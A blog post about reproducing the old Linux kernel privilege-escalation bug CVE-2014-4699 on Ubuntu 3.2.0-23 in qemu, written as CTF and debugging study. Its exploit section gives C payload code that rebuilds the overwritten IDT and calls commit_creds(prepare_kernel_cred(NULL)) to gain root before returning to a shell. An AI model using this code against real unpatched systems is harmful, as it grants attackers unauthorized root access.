---
layout: post
comments: true
title: "Resurrect an old vulnerability: CVE-2014-4699"
tags: [CVE, linux, gdb, kernel]
---

This post is multifunction: I will try to elaborate around a kernel vulnerability
that I encountered into a CTF.

All starts with the ``SYSRET`` instruction and the way is handled by the OS,
explained more in detail [here](https://blog.xenproject.org/2012/06/13/the-intel-sysret-privilege-escalation/),

    It has to do with a subtle difference in the way in which Intel processors
    implement error handling in their version of AMD’s SYSRET instruction. The
    SYSRET instruction is part of the x86-64 standard defined by AMD. If an
    operating system is written according to AMD’s spec, but run on Intel hardware,
    the difference in implementation can be exploited by an attacker to write to
    arbitrary addresses in the operating system’s memory.

During the years a lot of times this wrong implementation resurfaced, also
in different operating systems, but
in our particular case, i.e. **CVE-2014-4699**, we have the linux kernel,
specifically the ubuntu version ``3.2.0-23-generic #36``; the original writeup
of this is
by Vitaly Nikolenko and can be found [here](http://cyseclabs.com/page?n=21072014).

https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/

The quick and dirty way to describe the vulnerability is that simply allows to
indicate a stack pointer pointing in kernel space that allows to write into it.
We overwrite the ``IDT`` entry for the **page fault** exception that when raised
will make the code land in user space, in a buffer controlled by the attacker.

http://blog.scoutapp.com/articles/2015/04/10/understanding-page-faults-and-memory-swap-in-outs-when-should-you-worry

What we are interested in the first part of the post is to replicate the environment in order to test
the [exploit](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2014/CVE-2014-4699) usually
found when you search for that exact CVE.

## Install the kernel


This is an Ubuntu's kernel so we cannot use [snapshot.debian.org](http://snapshot.debian.org/)
to obtain the packages but we can use [archive.ubuntu.com](http://archive.ubuntu.com/ubuntu/pool/main/l/linux/)
and look for ``linux-image-3.2.0-23-generic_3.2.0-23.36_amd64.deb``. Otherwise you can
google the package and found the [launchpad page](https://launchpad.net/ubuntu/precise/amd64/linux-image-3.2.0-23-generic/3.2.0-23.36)
from which a link to the [source code](https://launchpad.net/ubuntu/+source/linux/3.2.0-23.36) is available.

First we try the original kernel:

```
$ wget http://launchpadlibrarian.net/101184741/linux-image-3.2.0-23-generic_3.2.0-23.36_amd64.deb
$ dpkg -x linux-image-3.2.0-23-generic_3.2.0-23.36_amd64.deb deb
$ tree -L 2 deb
deb
├── boot
│   ├── abi-3.2.0-23-generic
│   ├── config-3.2.0-23-generic
│   ├── System.map-3.2.0-23-generic
│   └── vmlinuz-3.2.0-23-generic
├── lib
│   ├── firmware
│   └── modules
└── usr
    └── share
$ md5sum deb/boot/vmlinuz-3.2.0-23-generic 
ec12ab2c89c1420f3362ebba47ddd23b  deb/boot/vmlinuz-3.2.0-23-generic
```

Start ``qemu`` using a system image (I built it using ``buildroot``)

```
$ qemu-system-x86_64 \
     -hda rootfs.ext2 \
     -m 1024 \
     -enable-kvm \
     -kernel deb/boot/vmlinuz-3.2.0-23-generic \
     -append 'root=/dev/sda \
     console=tty0 console=ttyS0 rw' \
     -net nic,model=virtio -net user,hostfwd=tcp::2222-:22 \
     -serial stdio
```

Download the exploit, compile it (statically) and upload it
on  the box

```
$ gcc -g -Wall cve.c -o cve -static
$ scp -o StrictHostKeyChecking=no -P 2222 cve root@localhost:/tmp
```

and finally execute it

```
# /tmp/cve
IDT addr = 0xffffffffff81dd7000
# [  307.696010] double fault: 0000 [#1] SMP 
[  307.696010] CPU 0 
[  307.696010] Modules linked in:
[  307.696010] 
[  307.696010] Pid: 124, comm: cve Not tainted 3.2.0-23-generic #36-Ubuntu QEMU Standard PC (i440FX + PIIX, 1996)
[  307.696010] RIP: 0010:[<000000008ffffbfe>]  [<000000008ffffbfe>] 0x8ffffbfd
[  307.696010] RSP: 0018:ffffffff81dd7010  EFLAGS: 00010046
[  307.696010] RAX: ffffffff81dd70e8 RBX: 0000000000000001 RCX: ffffffff8165c9ad
[  307.696010] RDX: 00000000ffffffff RSI: 0000000000000000 RDI: ffffffff81dd7078
[  307.696010] RBP: ffffffff81dd7068 R08: 81658e010010cb00 R09: 00000000ffffffff
[  307.696010] R10: 81668e0000106b10 R11: 0000000000000246 R12: ffffffff81dd7078
[  307.696010] R13: 0000000000000000 R14: 81668e0200106a90 R15: 00000000ffffffff
[  307.696010] FS:  0000000001415880(0063) GS:ffff88003fc00000(0000) knlGS:0000000000000000
[  307.696010] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
[  307.696010] CR2: 000000000000c500 CR3: 000000003cdd0000 CR4: 00000000000006f0
[  307.696010] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[  307.696010] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[  307.696010] Process cve (pid: 124, threadinfo ffff88003cdc6000, task ffff88003cf9dbc0)
[  307.696010] Stack:
[  307.696010]  0000000000000000 ffffffff8165d06f 0000000000000010 0000000000010046
[  307.696010]  ffffffff81dd7048 0000000000000018 8166ee0000106a10 00000000ffffffff
[  307.696010]  0000000000000001 81668e0000106ac0 00000000ffffffff 00000000ffffffff
[  307.696010] Call Trace:
[  307.696010] Code:  Bad RIP value.
[  307.696010] RIP  [<000000008ffffbfe>] 0x8ffffbfd
[  307.696010]  RSP <ffffffff81dd7010>
[  307.696010] ---[ end trace 971eb89b5231b79f ]---
```

Looking at poc running under gdb you can see that the address where the instruction pointer is set
raises a [double fault](https://en.wikipedia.org/wiki/Double_fault) (``0x000000008ffffbfe``) is in our code
in **userspace**!

```
gef➤  x/30i tmp - 15
   0x8ffffbf1:  nop
   0x8ffffbf2:  nop
   0x8ffffbf3:  swapgs               <--- tmp - 13
   0x8ffffbf6:  call   0x8ffffc00
   0x8ffffbfb:  swapgs 
   0x8ffffbfe:  iretq                <--- end 2nd memcpy()
   0x8ffffc00:  push   rbp           <--- start payload
   0x8ffffc01:  mov    rbp,rsp
   0x8ffffc04:  sub    rsp,0x20
   0x8ffffc08:  mov    QWORD PTR [rbp-0x8],0xffffffff81dd70e8
   0x8ffffc10:  mov    rax,QWORD PTR [rbp-0x8]
   0x8ffffc14:  mov    DWORD PTR [rax],0xffffffff
   0x8ffffc1a:  mov    QWORD PTR [rbp-0x10],0xffffffff81091630
   0x8ffffc22:  mov    QWORD PTR [rbp-0x18],0xffffffff810918e0
   0x8ffffc2a:  mov    rax,QWORD PTR [rbp-0x18]
   0x8ffffc2e:  mov    edi,0x0
   0x8ffffc33:  call   rax
   0x8ffffc35:  mov    rdx,rax
   0x8ffffc38:  mov    rax,QWORD PTR [rbp-0x10]
   0x8ffffc3c:  mov    rdi,rdx
   0x8ffffc3f:  call   rax
   0x8ffffc41:  nop
   0x8ffffc42:  leave  
   0x8ffffc43:  ret
```

and the stack pointer is located into the **interrupt description table**.

In order to understand how to fix this we need a kernel with debugging symbols and
I gonna compile it from source.

## Building a kernel with debugging symbols

Using the links indicated below is possible to download and patch
the kernel source code to obtain what is used to generate the
kernel in the ubuntu installation:

```
$ wget https://launchpad.net/ubuntu/+archive/primary/+files/linux_3.2.0.orig.tar.gz
$ tar zxvf linux_3.2.0.orig.tar.gz
$ wget https://launchpad.net/ubuntu/+archive/primary/+files/linux_3.2.0-23.36.diff.gz
$ cd linux-3.2
$ patch -p1 < /hack/linux_3.2.0-23.36.diff
```

and finally compile it

```
$ fakeroot debian/rules binary-generic
... A LOT OF STUFF
    cc1: error: code model kernel does not support PIC mode
... ANOTHER TSUNAMI OF SHIT
```

but obviously out of the box is not working:
because a kernel intended to build in 2012 doesn't compile in a Debian9 in 2018; lucky us
exists Docker

```
$ docker run -it -v $(pwd):/kernel ubuntu:12.04 /bin/bash
# apt-get update
# apt-get build-dep linux-image-3.2.0-23-generic
# chmod +x debian/rules
# chmod a+x debian/scripts/misc/*
# DEB_BUILD_OPTIONS=parallel=8 AUTOBUILD=1 NOEXTRAS=1 debian/rules binary-generic
 ...
dpkg-deb: building package `linux-image-3.2.0-23-generic' in `../linux-image-3.2.0-23-generic_3.2.0-23.36_amd64.deb'
 ...
# ls ./debian/build/build-generic/
Makefile        System.map  block   drivers   fs       init  kernel  mm               modules.order  scripts   sound   ubuntu        usr   vmlinux
Module.symvers  arch        crypto  firmware  include  ipc   lib     modules.builtin  net            security  source  ubuntu-build  virt  vmlinux.o
# ls ./debian/linux-image-3.2.0-23-generic/boot
System.map-3.2.0-23-generic  abi-3.2.0-23-generic  config-3.2.0-23-generic  vmlinuz-3.2.0-23-generic
```

if you want to build a kernel with debugging symbols add ``skipdbg=false`` at the end of the target of the
``debian/rules`` command. The package ``pkg-create-dbgsym`` is needed.

```
# tree ./debian/linux-image-3.2.0-23-generic-dbgsym/usr/lib/debug/ -L 2
./debian/linux-image-3.2.0-23-generic-dbgsym/usr/lib/debug/
|-- boot
|   `-- vmlinux-3.2.0-23-generic
`-- lib
    `-- modules

3 directories, 1 file
```

## Debug with Qemu

Debugging a OS is different from what you are used when debugging user space
programs, it's more similar to debug hardware: you have to connect externally
a particular tool and command the device by it.

We are using ``qemu`` to run the kernel, this tool allows to wait for a debugger: the options
for this are:

 - ``-s`` Shorthand for ``-gdb tcp::1234``, i.e. open a gdbserver on TCP port 1234
 - ``-S`` Do not start CPU at startup

So the way of using ``qemu`` is to use this options, start ``gdb`` from another
terminal and indicate that the target is communicating at port 1234.
Inside ``gdb`` is possible to use ``file`` to load symbols and ``directory``
to indicate search paths for source code.

```
$ gdb -q
gef➤  file ./debian/linux-image-3.2.0-23-generic-dbgsym/usr/lib/debug/boot/vmlinux-3.2.0-23-generic
gef➤  directory ./arch/x86/include/asm/
gef➤  target remote:1234
 ...
0x000000000000fff0 in swevent_htable ()
gef➤  print general_protection 
$7 = {<text variable, no debug info>} 0xffffffff8165cba0 <general_protection>
gef➤  c
Continuing.
```

Now you can start your debugging session. For starting we can look at the ``idt``
(this must be done after the initialization of the kernel, so I advice to
do that after the booting process is completed):

```
gef➤  print idt_table
$18 = 0xffffffff81dd7000
gef➤  print &idt_table[257]
$19 = (gate_desc *) 0xffffffff81dd8010 <static_command_line>
gef➤  dump memory /tmp/idt_table.bin 0xffffffff81dd7000 0xffffffff81dd8010
```

With these commands we have dumped the ``idt`` in a binary file; how you can
observe the address of ``idt_table`` coincides with the one that the PoC
found previously.

It's also possible to print put the ``idt_table`` and look at the value

```
gef➤  p *idt_table@256
$12 = { {
    offset_low = 0x69f0, 
    segment = 0x10, 
    ist = 0x0, 
    zero0 = 0x0, 
    type = 0xe, 
    dpl = 0x0, 
    p = 0x1, 
    offset_middle = 0x8166, 
    offset_high = 0xffffffff, 
    zero1 = 0x0
  }, {
 ...
  }, {
    offset_low = 0x68f0, 
    segment = 0x10, 
    ist = 0x0, 
    zero0 = 0x0, 
    type = 0xe, 
    dpl = 0x0, 
    p = 0x1, 
    offset_middle = 0x8166, 
    offset_high = 0xffffffff, 
    zero1 = 0x0
  }}
```

## Exploring kernel source code

``ctags -R .`` helps a lot

``arch/x86/include/asm/desc_defs.h``

```
struct gate_struct {
	u16		offset_low;
	u16		segment;
	struct idt_bits	bits;
	u16		offset_middle;
#ifdef CONFIG_X86_64
	u32		offset_high;
	u32		reserved;
#endif
} __attribute__((packed));

typedef struct gate_struct gate_desc;
```

``arch/x86/kernel/idt.c``

The page fault mechanism is implemented in ``asm/x86/kernel/traps.c``

```
/* Set of traps needed for early debugging. */
void __init early_trap_init(void)
{
	set_intr_gate_ist(1, &debug, DEBUG_STACK);
	/* int3 can be called from all */
	set_system_intr_gate_ist(3, &int3, DEBUG_STACK);
	set_intr_gate(14, &page_fault);
	load_idt(&idt_descr);
}
```

```
static inline void set_intr_gate(unsigned int n, void *addr)
{
	BUG_ON((unsigned)n > 0xFF);
	_set_gate(n, GATE_INTERRUPT, addr, 0, 0, __KERNEL_CS);
}

static inline void _set_gate(int gate, unsigned type, void *addr,
			     unsigned dpl, unsigned ist, unsigned seg)
{
	gate_desc s;

	pack_gate(&s, type, (unsigned long)addr, dpl, ist, seg);
	/*
	 * does not need to be atomic because it is only done once at
	 * setup time
	 */
	write_idt_entry(idt_table, gate, &s);
}

static inline void pack_gate(gate_desc *gate, unsigned type, unsigned long func,
			     unsigned dpl, unsigned ist, unsigned seg)
{
	gate->offset_low	= PTR_LOW(func);
	gate->segment		= __KERNEL_CS;
	gate->ist		= ist;
	gate->p			= 1;
	gate->dpl		= dpl;
	gate->zero0		= 0;
	gate->zero1		= 0;
	gate->type		= type;
	gate->offset_middle	= PTR_MIDDLE(func);
	gate->offset_high	= PTR_HIGH(func);
}


```


```
$ xxd --include /tmp/idt_table.bin | head
unsigned char _tmp_idt_table_bin[] = {
  0xf0, 0x69, 0x10, 0x00, 0x00, 0x8e, 0x66, 0x81, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x80, 0xca, 0x10, 0x00, 0x04, 0x8e, 0x65, 0x81,
 ...
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x40, 0x89, 0xfa, 0x3f, 0x00, 0x88, 0xff, 0xff
};
unsigned int _tmp_idt_table_bin_len = 4112;
```




## Improve the exploit

Following the methodology used by fail0verflow to develop a reliable exploit
for [FreeBSD](https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/)
the missing piece is recreating the ``IDT`` messed up by the existing exploit.


```C
#define set_entry(obj,n,_ist,_dpl,middle,low) ({  \
	obj[n].offset_low = low;            \
    obj[n].segment = 0x10;              \
    obj[n].offset_middle = middle;      \
    obj[n].offset_high = 0xffffffff;    \
    obj[n].ist = _ist;                  \
    obj[n].zero0 = 0x0;                 \
    obj[n].zero1 = 0x0;                 \
    obj[n].dpl = _dpl;                  \
    obj[n].type = 0xe;                  \
    obj[n].p = 0x1;                     \
    })

void __attribute__((regparm(3))) payload() {
    gate_desc* idt_table = (void*)0xffffffff81dd7000;

    set_entry(idt_table,  0, 0x0, 0x0, 0x8166, 0x69f0);
    set_entry(idt_table,  1, 0x4, 0x0, 0x8165, 0xca80);
    set_entry(idt_table,  2, 0x3, 0x0, 0x8165, 0xce90);
    /* MORE STUFFS HERE */
    set_entry(idt_table, 17, 0x0, 0x0, 0x8166, 0x6b80);

	commit_creds_fn commit_creds = (commit_creds_fn)0xffffffff81091630;
	prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)0xffffffff810918e0;
	commit_creds(prepare_kernel_cred((uint64_t)NULL));

	asm("swapgs;"
        "mov $tf, %rsp;"
        "iretq;");
}
```

The second step is to build a fake stack frame to be used by the ``iretq``
instruction to retun in userspace: this instruction pops from the stack
the registers ``rip``, ``cs``, the processor flags, the stack pointer
and finally the register ``ss``; we can reconstruct it with the following
``C`` struct

```C
struct trap_frame {
    uint64_t eip;    // instruction pointer
    uint64_t cs;     // code segment
    uint64_t eflags; // CPU flags
    uint64_t esp;    // stack pointer
    uint64_t ss;     // stack segment
}__attribute__ (( packed ));

struct trap_frame tf;

void prepare_tf ( void ) {
    asm("movq %cs, %rax; pushq %rax;   popq tf+8;"
        "pushfq;     popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "movq %ss, %rax; pushq %rax;  popq tf+32;");
    tf.eip = (uint64_t)&launch_shell;
    tf.esp -= 1024; // unused part of stack
}
```

Take in mind that the registers ``cs`` and ``ss`` cannot pushed directly
into the stack.

```
$ od -t x1 -A d linux_image/boot/vmlinuz-3.2.0-23-generic | grep "1f 8b 08"
0018016 48 8d 83 50 37 4b 00 ff e0 1f 8b 08 00 00 00 00
$ dd if=linux_image/boot/vmlinuz-3.2.0-23-generic bs=1 skip=0018025 | zcat > vmlinux
4947815+0 record dentro
4947815+0 record fuori
4947815 bytes (4,9 MB, 4,7 MiB) copied, 3,25252 s, 1,5 MB/s

gzip: stdin: decompression OK, trailing garbage ignored
$ file vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=6171fe7a98b41dfbe7ed9afa8b1c033f3acaff9c, stripped
```



```
$ vimdiff  <(xxd /tmp/idt_table.bin) <(xxd /tmp/idt_table_trashed2.bin)
```

![idt trashing]({{ site.baseurl }}/public/images/idt-diff.png)

If we want to restore the ``idt``, ``gdb`` has a command for it: ``restore``
```
gef➤  restore /tmp/idt_table.bin binary 0xffffffff81dd7000
Restoring binary file /tmp/idt_table.bin into memory (0xffffffff81dd7000 to 0xffffffff81dd8010)
```


```
/* Interrupts/Exceptions */
enum {
    X86_TRAP_DE = 0,    /*  0, Divide-by-zero */
    X86_TRAP_DB,        /*  1, Debug */
    X86_TRAP_NMI,        /*  2, Non-maskable Interrupt */
    X86_TRAP_BP,        /*  3, Breakpoint */
    X86_TRAP_OF,        /*  4, Overflow */
    X86_TRAP_BR,        /*  5, Bound Range Exceeded */
    X86_TRAP_UD,        /*  6, Invalid Opcode */
    X86_TRAP_NM,        /*  7, Device Not Available */
    X86_TRAP_DF,        /*  8, Double Fault */
    X86_TRAP_OLD_MF,    /*  9, Coprocessor Segment Overrun */
    X86_TRAP_TS,        /* 10, Invalid TSS */
    X86_TRAP_NP,        /* 11, Segment Not Present */
    X86_TRAP_SS,        /* 12, Stack Segment Fault */
    X86_TRAP_GP,        /* 13, General Protection Fault */
    X86_TRAP_PF,        /* 14, Page Fault */
    X86_TRAP_SPURIOUS,    /* 15, Spurious Interrupt */
    X86_TRAP_MF,        /* 16, x87 Floating-Point Exception */
    X86_TRAP_AC,        /* 17, Alignment Check */
    X86_TRAP_MC,        /* 18, Machine Check */
    X86_TRAP_XF,        /* 19, SIMD Floating-Point Exception */
    X86_TRAP_IRET = 32,    /* 32, IRET Exception */
};
```

BTW you can use [eudyptula-boot](https://vincent.bernat.im/en/blog/2014-eudyptula-boot) to
create a replicable kernel environment.

## Extra

I want to create the shellcode from a module

```
# dpkg -i ../linux-headers-3.2.0-23-generic_3.2.0-23.36_amd64.deb
# make -C /lib/modules/3.2.0-23-generic/build M=$PWD
make: Entering directory `/usr/src/linux-headers-3.2.0-23-generic'
  CC [M]  /modules/cve-exploit.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /modules/cve-exploit.mod.o
  LD [M]  /modules/cve-exploit.ko
make: Leaving directory `/usr/src/linux-headers-3.2.0-23-generic'
```
https://github.com/torvalds/linux/blob/master/Documentation/kbuild/modules.txt

## Trying in an Ubuntu installation

Now that we have a (hopefully) working exploit, we can try it in the intended target,
the first release of Ubuntu 12.04 that can be found in [old-release.ubuntu.com](http://old-releases.ubuntu.com/releases/12.04.1/);
once downloaded the ``ISO`` our dear ``qemu`` can be used again

```
$ qemu-system-x86_64 \
    -hda output/images/rootfs.ext2 \
    -m 2048 \
    -enable-kvm \
    -cdrom ubuntu-12.04-desktop-amd64.iso -net nic,model=virtio \
    -net user,hostfwd=tcp::2222-:22 -serial stdio
```

Be aware that ``ssh`` doesn't work and with less than 2048Mb of memory the proof of concept
cannot allocate the buffer for the payload.

With my big surprise the exploit crashes the kernel, without any error message
not even a kernel dump! after a little thinking this is obvious: message happens on the
virtual console (the terminal that can be accessed with ``Ctrl+Alt+F1`` on a normal
Linux installation).

From the virtual console this is what the dump looks like 

![virtualbox panic]({{ site.baseurl }}/public/images/virtualbox-crash.png)

(by the way this is in virtualbox  where ``Host+F1`` opens the virtual console).
How you can see the exploit has worked but the system crashes in what seems
a crash of ``init``.


## Links

[kernel exploitation for dummies](http://uaf.io/exploitation/misc/2016/09/10/Kernel-Exploitation-for-Dummies.html)

https://help.ubuntu.com/community/Kernel/Compile

https://wiki.ubuntu.com/Kernel/BuildYourOwnKernel

https://medium.com/square-corner-blog/a-short-guide-to-kernel-debugging-e6fdbe7bfcdf

https://kernelnewbies.org/FAQ/asmlinkage
https://0xax.gitbooks.io/linux-insides/content/KernelStructures/linux-kernelstructure-1.html
 - [Phrack: Handling Interrupt Descriptor Table for fun and profit](http://phrack.org/issues/59/4.html)
 - [Writing kernel exploits](https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf)
 - [How Endianness Effects Bitfield Packing](http://mjfrazer.org/mjfrazer/bitfields/)
https://rlworkman.net/system.map/
https://www.elinux.org/Debugging_The_Linux_Kernel_Using_Gdb
https://01.org/linuxgraphics/gfx-docs/drm/dev-tools/gdb-kernel-debugging.html
https://www.kernel.org/doc/html/v4.11/dev-tools/gdb-kernel-debugging.html
https://stackoverflow.com/questions/26271901/is-it-possible-to-use-gdb-and-qemu-to-debug-linux-user-space-programs-and-kernel
https://github.com/torvalds/linux/blob/master/scripts/gdb/vmlinux-gdb.py
https://kernelnewbies.org/FAQ/BUG


http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
